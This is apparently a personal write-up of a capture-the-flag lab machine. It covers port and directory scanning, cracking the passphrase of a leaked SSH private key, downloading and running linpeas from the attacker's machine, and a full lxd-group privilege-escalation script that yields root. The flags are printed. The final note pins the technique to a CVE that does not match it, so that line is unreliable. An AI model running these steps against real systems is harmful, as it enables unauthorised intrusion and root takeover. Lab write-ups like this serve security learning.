### ip = 10.49.139.80

# Recon 
	Found a coment in the source page: 
		<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
	Username: john 


# Nmap Scan	
	> nmap -T5 -p- 10.49.139.80                           
		Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 14:23 IST
		Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
		SYN Stealth Scan Timing: About 28.56% done; ETC: 14:25 (0:01:30 remaining)
		Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
		SYN Stealth Scan Timing: About 28.73% done; ETC: 14:25 (0:01:32 remaining)
		Warning: 10.49.139.80 giving up on port because retransmission cap hit (2).
		Nmap scan report for 10.49.139.80
		Host is up (0.071s latency).
		Not shown: 65533 closed tcp ports (reset)
		PORT   STATE SERVICE
		22/tcp open  ssh
		80/tcp open  http

		Nmap done: 1 IP address (1 host up) scanned in 140.99 seconds
		
	> nmap -sC -sV -sS -p 22,80 10.49.139.80           
		Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 14:27 IST
		Nmap scan report for 10.49.139.80
		Host is up (0.060s latency).

		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
		|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
		|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
		80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
		|_http-server-header: Apache/2.4.29 (Ubuntu)
		|_http-title: House of danak
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 10.38 seconds
		
		
# Gobuster 
	> gobuster dir -u https://10.49.139.80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
		===============================================================
		Gobuster v3.8
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     https://10.49.139.80/
		[+] Method:                  GET
		[+] Threads:                 10
		[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.8
		[+] Timeout:                 10s
		===============================================================
		Starting gobuster in directory enumeration mode
		===============================================================
		Progress: 0 / 1 (0.00%)
		2026/01/12 14:23:47 error on running gobuster on https://10.49.139.80/: connection refused
				                                                                                                                                                       
		┌──(kali㉿kali)-[~]
		└─$ gobuster dir -u http://10.49.139.80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
		===============================================================
		Gobuster v3.8
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.49.139.80/
		[+] Method:                  GET
		[+] Threads:                 10
		[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.8
		[+] Timeout:                 10s
		===============================================================
		Starting gobuster in directory enumeration mode
		===============================================================
		/uploads              (Status: 301) [Size: 314] [--> http://10.49.139.80/uploads/]
		/secret               (Status: 301) [Size: 313] [--> http://10.49.139.80/secret/]
		Progress: 61894 / 220558 (28.06%)^C

## Found 
	/secret page --->> Contains a Private Key
			-----BEGIN RSA PRIVATE KEY-----
			Proc-Type: 4,ENCRYPTED
			DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

			T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
			H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
			FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
			Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
			9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
			IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
			SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
			/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
			w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
			6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
			Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
			xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
			8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
			b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
			vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
			wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
			rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
			RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
			oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
			cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
			99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
			Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
			Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
			v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
			gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
			-----END RSA PRIVATE KEY-----

ssh key to a txt file format		
> ssh2john id_rsa > ssh_gserver.txt

Cracking the pass 
> john --wordlist=/usr/share/wordlists/rockyou.txt ssh_gserver.txt

Persmission for sid_rsa file:
> 	chmod 600 id_rsa


john@exploitable:~$ cat user.txt 
		a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e


# Getting Linpeas
Attacker Machine
	http server in /usr/share/peass
>	python3 -m http.server

Victim Machine 
>	wget http://<attacker_ip>/linpeas.sh
>	chmod +x linpeas.sh
>	./linpeas.sh


Found user to be in <lxd grp> | Also <lxd daemon> active
Googled lxd vulnerablity ; Found an exploit --> "https://www.exploit-db.com/exploits/46978"
Went to the github url as given and cloned the repo 
	it had a build-aline.sh file and a alpine...tar.gz file 
	and copied the shell-script in exploit db 
		```
			#!/usr/bin/env bash

			# ----------------------------------
			# Authors: Marcelo Vazquez (S4vitar)
			#	   Victor Lasa      (vowkin)
			# ----------------------------------

			# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
			# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
			# Step 3: Run this script and you will get root [Victim Machine]
			# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

			function helpPanel(){
			  echo -e "\nUsage:"
			  echo -e "\t[-f] Filename (.tar.gz alpine file)"
			  echo -e "\t[-h] Show this help panel\n"
			  exit 1
			}

			function createContainer(){
			  lxc image import $filename --alias alpine && lxd init --auto
			  echo -e "[*] Listing images...\n" && lxc image list
			  lxc init alpine privesc -c security.privileged=true
			  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
			  lxc start privesc
			  lxc exec privesc sh
			  cleanup
			}

			function cleanup(){
			  echo -en "\n[*] Removing container..."
			  lxc stop privesc && lxc delete privesc && lxc image delete alpine
			  echo " [√]"
			}

			set -o nounset
			set -o errexit

			declare -i parameter_enable=0; while getopts ":f:h:" arg; do
			  case $arg in
			    f) filename=$OPTARG && let parameter_enable+=1;;
			    h) helpPanel;;
			  esac
			done

			if [ $parameter_enable -ne 1 ]; then
			  helpPanel
			else
			  createContainer
			fi				    
		```

http server in attackers machine and took the file in the victim using "http server"
ran the file
> cd ..
> cd mnt/root/root
>cat root.txt

Found root flag
# root flag: 
	2e337b8c9f3aff0c2b3e8d4e6a7c88fc


# LEARNT THINGS
	LXC Vulnerability [(CVE-2022-47952)] -- Information Disclosure
	
	


